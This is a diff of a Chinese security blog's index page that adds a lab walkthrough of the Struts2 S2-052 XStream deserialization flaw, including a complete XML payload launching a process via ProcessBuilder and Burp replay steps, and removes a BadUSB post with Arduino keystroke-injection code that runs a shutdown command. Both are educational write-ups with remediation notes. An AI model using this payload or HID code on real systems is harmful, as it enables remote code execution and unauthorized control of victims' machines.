@@ -258,6 +258,274 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/22/struts2-052漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/01/22/struts2-052漏洞/" itemprop="url">
+                  struts2-052漏洞
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-22T21:39:50+08:00">
+                2018-01-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/01/22/struts2-052漏洞/" class="leancloud_visitors" data-flag-title="struts2-052漏洞">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-struts2"><a href="#0x00-struts2" class="headerlink" title="0x00 struts2"></a>0x00 struts2</h2><p>struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。  </p>
+<h2 id="0x01-struts2-052漏洞"><a href="#0x01-struts2-052漏洞" class="headerlink" title="0x01 struts2-052漏洞"></a>0x01 struts2-052漏洞</h2><p>struts2-052漏洞触发点是REST插件在解析请求中的xml文件时，调用了XStreamHandler，传入的数据会被默认进行反序列化，如果当传入的xml是个经过XStream序列化的恶意对象时，便造成反序列化漏洞，构成远程代码执行。  </p>
+<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>这次漏洞使用windows系统做测试对象。  </p>
+<p>下载java并配置环境:  </p>
+<ul>
+<li><p>在java官网下载java1.8  </p>
+</li>
+<li><p>然后添加到windows环境变量<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/struts2-52/struts1.png" alt="">  </p>
+</li>
+</ul>
+<p>下载tomcat并配置环境：  </p>
+<ul>
+<li>在tomcat官网下载tomcat并解压  </li>
+<li>然后添加到windows环境变量  </li>
+</ul>
+<p>下载存在漏洞的struts2框架版本：  </p>
+<p>在 <a href="http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip" target="_blank" rel="noopener">http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip</a> 下载漏洞影响的最后版本2.5.12<br>解压后将struts2-rest-showcase.war复制到tomcat的webapps的目录下  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/struts2-52/struts2.png" alt="">  </p>
+<p>更改/tomcat/conf中的server.xml，默认是8080，如果冲突我们可以将端口号更改到空闲端口，这里改到了12345  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/struts2-52/struts3.png" alt="">  </p>
+<p>打开/tomcat/bin中的startup.bat，并通过浏览器访问页面。  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/struts2-52/struts4.png" alt="">  </p>
+<h2 id="0x03-payload生成"><a href="#0x03-payload生成" class="headerlink" title="0x03 payload生成"></a>0x03 payload生成</h2><p>若本机拥有git环境，则使用<br>git clone <a href="https://github.com/mbechler/marshalsec.git" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec.git</a><br>然后参考 <a href="https://github.com/mbechler/marshalsec.git" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec.git</a> 中的使用方法<br>来生成payload<br>如果没有，可以在网络中查找一段windows的payload，并将此段代码中command标签中的内容更改成想在cmd中执行的命令，这里使用了calc</p>
+<pre><code>&lt;map&gt;
+  &lt;entry&gt;
+    &lt;jdk.nashorn.internal.objects.NativeString&gt;
+      &lt;flags&gt;0&lt;/flags&gt;
+      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;
+        &lt;dataHandler&gt;
+          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;
+            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;
+              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;
+                &lt;initialized&gt;false&lt;/initialized&gt;
+                &lt;opmode&gt;0&lt;/opmode&gt;
+                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
+                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
+                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;
+                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;
+                      &lt;command&gt;
+                        &lt;string&gt;calc&lt;/string&gt;
+                      &lt;/command&gt;
+                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;
+                    &lt;/next&gt;
+                  &lt;/iter&gt;
+                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;
+                    &lt;method&gt;
+                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;
+                      &lt;name&gt;start&lt;/name&gt;
+                      &lt;parameter-types/&gt;
+                    &lt;/method&gt;
+                    &lt;name&gt;foo&lt;/name&gt;
+                  &lt;/filter&gt;
+                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;
+                &lt;/serviceIterator&gt;
+                &lt;lock/&gt;
+              &lt;/cipher&gt;
+              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;
+              &lt;ibuffer&gt;&lt;/ibuffer&gt;
+              &lt;done&gt;false&lt;/done&gt;
+              &lt;ostart&gt;0&lt;/ostart&gt;
+              &lt;ofinish&gt;0&lt;/ofinish&gt;
+              &lt;closed&gt;false&lt;/closed&gt;
+            &lt;/is&gt;
+            &lt;consumed&gt;false&lt;/consumed&gt;
+          &lt;/dataSource&gt;
+          &lt;transferFlavors/&gt;
+        &lt;/dataHandler&gt;
+        &lt;dataLen&gt;0&lt;/dataLen&gt;
+      &lt;/value&gt;
+    &lt;/jdk.nashorn.internal.objects.NativeString&gt;
+    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;
+  &lt;/entry&gt;
+  &lt;entry&gt;
+    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
+    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
+  &lt;/entry&gt;
+&lt;/map&gt;
+</code></pre><p>具体构造命令时，某些字符无法直接输入，关于这部分的构造方法在 <a href="http://www.freebuf.com/vuls/147017.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/147017.html</a>  </p>
+<h2 id="0x04-使用burpsuite进行截包重发"><a href="#0x04-使用burpsuite进行截包重发" class="headerlink" title="0x04 使用burpsuite进行截包重发"></a>0x04 使用burpsuite进行截包重发</h2><p>将burpsuite中的监听设置成127.0.0.1:8082  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/struts2-52/struts5.png" alt="">  </p>
+<p>将浏览器的代理设置成手动代理，ip和端口号与burpsuite中设置相同  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/struts2-52/struts6.png" alt="">  </p>
+<p>然后用浏览器访问 <a href="http://localhost:12345/struts2-rest-showcase" target="_blank" rel="noopener">http://localhost:12345/struts2-rest-showcase</a>  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/struts2-52/struts7.png" alt="">  </p>
+<p>然后利用brupsuite截断一次提交的数据  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/struts2-52/struts8.png" alt="">  </p>
+<p>将content-type改成application/xml，将body部分数据改为之前写好的payload  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/struts2-52/struts9.png" alt="">  </p>
+<p>然后提交，成功弹出本机计算器  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/struts2-52/struts10.png" alt="">  </p>
+<h2 id="0x05-使用openvas对该存在漏洞的系统进行扫描"><a href="#0x05-使用openvas对该存在漏洞的系统进行扫描" class="headerlink" title="0x05 使用openvas对该存在漏洞的系统进行扫描"></a>0x05 使用openvas对该存在漏洞的系统进行扫描</h2><p>扫描结果如下:  </p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/struts2-52/struts11.png" alt="">  </p>
+<h2 id="0x06-危害"><a href="#0x06-危害" class="headerlink" title="0x06 危害"></a>0x06 危害</h2><p>入侵者可以直接通过提交数据包对服务器进行操作，可以远程执行代码随意查看服务器内容，还可以通过命令写入木马、创建用户、留下后门。  </p>
+<h2 id="0x07-应对方案"><a href="#0x07-应对方案" class="headerlink" title="0x07 应对方案"></a>0x07 应对方案</h2><ul>
+<li>升级Struts到2.5.13最新版本</li>
+<li>在不使用时删除Struts REST插件</li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/21/通过mysql弱密码获取webshell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2081,187 +2349,6 @@ main()
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/10/15/模拟键盘攻击——BadUSB制作/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/10/15/模拟键盘攻击——BadUSB制作/" itemprop="url">
-                  模拟键盘攻击——BadUSB制作
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-15T11:34:52+08:00">
-                2017-10-15
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/硬件安全/" itemprop="url" rel="index">
-                    <span itemprop="name">硬件安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2017/10/15/模拟键盘攻击——BadUSB制作/" class="leancloud_visitors" data-flag-title="模拟键盘攻击——BadUSB制作">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-什么是BadUSB"><a href="#0x00-什么是BadUSB" class="headerlink" title="0x00 什么是BadUSB"></a>0x00 什么是BadUSB</h2><p>BadUSB主要依靠USB拇指驱动器的构建方式，USB通常有一个大的可重写的内存芯片用于实际的数据存储，以及一个独立的控制器芯片。类似于笔记本电脑的硬盘驱动器包含一个隐藏的主引导记录(Master Boot Record)，内存芯片中内存单元的第一段包含让USB记录的编程，也就是说他不是利用普通u盘的autorun.inf，不会被检测到，这样攻击者植入恶意软件就不会被发现。  </p>
-<h2 id="0x01-USB协议漏洞"><a href="#0x01-USB协议漏洞" class="headerlink" title="0x01 USB协议漏洞"></a>0x01 USB协议漏洞</h2><p>现在的USB设备很多，比如音视频设备、摄像头等，因此要求系统提供最大的兼容性，甚至免驱；所以在设计USB标准的时候没有要求每个USB设备像网络设备那样占有一个唯一可识别的MAC地址让系统进行验证，而是允许一个USB设备具有多个输入输出设备的特征。这样就可以通过重写U盘固件，伪装成一个USB键盘，并通过虚拟键盘输入集成到U盘固件中的指令和代码而进行攻击。  </p>
-<h2 id="0x02-需要的工具"><a href="#0x02-需要的工具" class="headerlink" title="0x02 需要的工具"></a>0x02 需要的工具</h2><ul>
-<li>一块Arduino leonardo开发板，选择他是因为板子体积小容易包装成一个普通的u盘，并且代码非常好书写。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/badusb/1.jpg" alt=""></li>
-<li>Arduino ide，我们需要用它写代码并且烧录到badusb里面。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/badusb/2.png" alt=""></li>
-<li>外壳，将它包装的像一个普通u盘，不然这么块板子谁电脑会让你随便插，当然你也可以直接去淘宝购买已经包装好的badusb。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/badusb/3.png" alt=""></li>
-</ul>
-<h2 id="0x03-写入代码"><a href="#0x03-写入代码" class="headerlink" title="0x03 写入代码"></a>0x03 写入代码</h2><p>我们通过keyboard.h库里面提供的方法模拟键盘输入。如果进攻对象是windows的话，首先win+r然后输入cmd，进入命令行，这个时候几乎可以做到所有事情。如果进攻对象是linux，一般是ctrl+alt+t的组合开启terminal然后再输入命令。无论是进入哪种，只要你预先写好代码，对目标计算机上的文件下载，上传，删除，运行······怎么做都可以。<br>这里我们给出一个windows下的无害代码，使得我们u盘插入后目标计算机十秒关机。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;Keyboard.h&gt;</span><br><span class="line">void setup() &#123;</span><br><span class="line">  // put your setup code here, to run once:</span><br><span class="line">Keyboard.begin();//开始键盘通讯</span><br><span class="line">delay(3000);//延时</span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);//win键</span><br><span class="line">delay(50);</span><br><span class="line">Keyboard.press(&apos;r&apos;);//r键</span><br><span class="line">delay(50);</span><br><span class="line">Keyboard.release(KEY_LEFT_GUI);//这里松开按键</span><br><span class="line">Keyboard.release(&apos;r&apos;);</span><br><span class="line">delay(1000);</span><br><span class="line">Keyboard.println(&quot;cmd \n&quot;); //注意这里命令多了一个空格 如果目标终端的输入法是中文的话这个空格非常关键</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.println(&quot;shutdown -s -t 10 \n&quot;); ; //注意有一个空格</span><br><span class="line">delay(1000);//延时</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">void loop() &#123;</span><br><span class="line">  // put your main code here, to run repeatedly:</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>然后我们接入开发板，选择好串口和板子型号，按ctrl+u烧录，之后就可以用它来测试了。<br><img src="http://oo3iot5oz.bkt.clouddn.com/badusb/4.png" alt="选择端口"><br><img src="http://oo3iot5oz.bkt.clouddn.com/badusb/5.png" alt="选择型号">  </p>
-<h2 id="0x04-扩展"><a href="#0x04-扩展" class="headerlink" title="0x04 扩展"></a>0x04 扩展</h2><p>上面只提供了一个无害代码，有危害的恶意代码我不会在这里提供，但是我们应该意识到它的危害是巨大的，在针对性的编程下，可以不知不觉拷贝你电脑的任何数据，可以偷偷的下载木马病毒并且添加到启动项，控制你的通讯工具发送消息，甚至可以越过虚拟机进攻宿主机。<br>所以usb外设提供了太多很难防御的入侵方式，存放重要数据的电脑尽量避免与人共享usb外设。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2311,7 +2398,7 @@ main()
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">91</span>
+                <span class="site-state-item-count">92</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2322,7 +2409,7 @@ main()
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">21</span>
+                <span class="site-state-item-count">22</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
